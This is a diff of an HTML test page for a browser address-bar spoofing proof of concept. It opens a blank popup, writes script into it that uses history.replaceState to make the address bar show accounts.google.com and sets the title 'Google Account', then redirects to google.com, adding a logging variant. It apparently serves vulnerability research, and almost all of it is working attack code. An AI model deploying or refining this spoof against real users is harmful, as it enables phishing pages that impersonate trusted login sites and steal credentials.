@@ -1,42 +1,102 @@
 <html>
 <head>
-    <title>Race Condition Test</title>
+    <title>Race Condition Debug</title>
 </head>
 <body>
-    <button onclick="testRaceCondition()">Test Race Condition</button>
+    <h2>Race Condition Test</h2>
+    <button onclick="testSimple()">Test Simple Version</button>
+    <button onclick="testWithLogs()">Test With Console Logs</button>
+    
+    <div id="status" style="margin-top: 20px; padding: 10px; background: #f0f0f0;"></div>
 
     <script>
-        function testRaceCondition() {
-            const w = window.open('', '_blank');
+        function testSimple() {
+            const status = document.getElementById('status');
+            status.innerHTML = "Opening popup...";
             
-            // Timing critical section
-            const startTime = Date.now();
-            
-            w.document.write(`
-                <html>
-                <body>
-                    <h1>Testing Timing</h1>
-                    <p id="timing"></p>
+            try {
+                const w = window.open('', '_blank', 'width=400,height=300');
+                
+                if (!w) {
+                    status.innerHTML = "❌ Popup blocked! Please allow popups";
+                    return;
+                }
+                
+                w.document.write(`
+                    <h3>Popup Opened Successfully</h3>
+                    <p>Address bar should be spoofed now</p>
                     <script>
-                        const start = Date.now();
-                        
-                        // Try spoof ASAP
+                        // Immediate address bar spoof
                         history.replaceState({}, 'Google', 'https://accounts.google.com');
-                        const afterSpoof = Date.now();
+                        document.title = 'Google Account';
+                        
+                        // Redirect after 1 second
+                        setTimeout(() => {
+                            window.location.href = 'https://www.google.com';
+                        }, 1000);
+                    <\/script>
+                `);
+                w.document.close();
+                
+                status.innerHTML = "✅ Popup opened! Check address bar";
+                
+            } catch(e) {
+                status.innerHTML = "❌ Error: " + e.message;
+            }
+        }
+
+        function testWithLogs() {
+            const status = document.getElementById('status');
+            status.innerHTML = "Testing with detailed logs...";
+            
+            const w = window.open('', '_blank', 'width=400,height=400');
+            
+            if (w) {
+                w.console.log = function(msg) { 
+                    status.innerHTML += "<br>Popup log: " + msg; 
+                };
+                
+                w.document.write(`
+                    <h3>Debug Mode</h3>
+                    <div id="popupStatus">Initializing...</div>
+                    
+                    <script>
+                        let logs = [];
+                        
+                        // Log each step
+                        logs.push('Popup loaded');
+                        document.getElementById('popupStatus').innerHTML = 'Step 1: Loaded';
+                        
+                        // Try address bar spoof
+                        try {
+                            history.replaceState({}, 'Google', 'https://accounts.google.com');
+                            logs.push('Address bar spoofed');
+                            document.getElementById('popupStatus').innerHTML = 'Step 2: Address bar changed to accounts.google.com';
+                        } catch(e) {
+                            logs.push('Spoof failed: ' + e);
+                        }
                         
                         // Try redirect
                         setTimeout(() => {
-                            const beforeRedirect = Date.now();
-                            window.location.href = 'https://google.com';
+                            logs.push('Attempting redirect to google.com');
+                            document.getElementById('popupStatus').innerHTML = 'Step 3: Redirecting to google.com...';
                             
-                            document.getElementById('timing').innerHTML = 
-                                'Spoof: ' + (afterSpoof - start) + 'ms<br>' +
-                                'Redirect: ' + (beforeRedirect - start) + 'ms';
-                        }, 10);
+                            window.location.href = 'https://www.google.com';
+                        }, 2000);
+                        
+                        // Display all logs
+                        setTimeout(() => {
+                            document.getElementById('popupStatus').innerHTML = 
+                                'All Steps Completed:<br>' + logs.join('<br>');
+                        }, 2500);
                     <\/script>
-                </body>
-                </html>
-            `);
+                `);
+                w.document.close();
+                
+                status.innerHTML = "✅ Debug popup opened! Watch the steps...";
+            } else {
+                status.innerHTML = "❌ Popup blocked!";
+            }
         }
     </script>
 </body>
